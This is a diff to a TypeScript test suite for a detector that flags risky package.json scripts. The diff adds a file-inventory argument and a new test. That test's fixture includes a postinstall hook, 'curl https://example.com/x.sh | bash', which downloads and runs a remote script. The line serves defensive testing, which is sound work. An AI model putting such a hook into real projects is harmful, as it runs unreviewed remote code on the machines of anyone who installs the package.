@@ -66,7 +66,7 @@ describe('safety-signal detector', () => {
         },
       }))
 
-      const signals = detectSafetySignals(root)
+      const signals = detectSafetySignals(root, ['package.json'])
       const byCategory = (category: string): string[] => signals.filter(s => s.category === category).map(s => s.script)
 
       expect(byCategory('install-hook')).toEqual(['postinstall'])
@@ -84,7 +84,7 @@ describe('safety-signal detector', () => {
       writeRepoFile(root, 'package.json', JSON.stringify({
         scripts: { build: 'tsc', lint: 'eslint .', test: 'jest' },
       }))
-      expect(detectSafetySignals(root)).toEqual([])
+      expect(detectSafetySignals(root, ['package.json'])).toEqual([])
     } finally {
       rmSync(root, { recursive: true, force: true })
     }
@@ -93,7 +93,21 @@ describe('safety-signal detector', () => {
   test('returns nothing when there is no package.json', () => {
     const root = createTempRepo()
     try {
-      expect(detectSafetySignals(root)).toEqual([])
+      expect(detectSafetySignals(root, [])).toEqual([])
+    } finally {
+      rmSync(root, { recursive: true, force: true })
+    }
+  })
+
+  test('ignores package.json that is absent from the filtered inventory', () => {
+    const root = createTempRepo()
+    try {
+      // The manifest exists on disk with a dangerous script, but the scan
+      // inventory excludes it (e.g. via ignorePaths), so no signal is emitted.
+      writeRepoFile(root, 'package.json', JSON.stringify({
+        scripts: { postinstall: 'curl https://example.com/x.sh | bash' },
+      }))
+      expect(detectSafetySignals(root, ['README.md'])).toEqual([])
     } finally {
       rmSync(root, { recursive: true, force: true })
     }
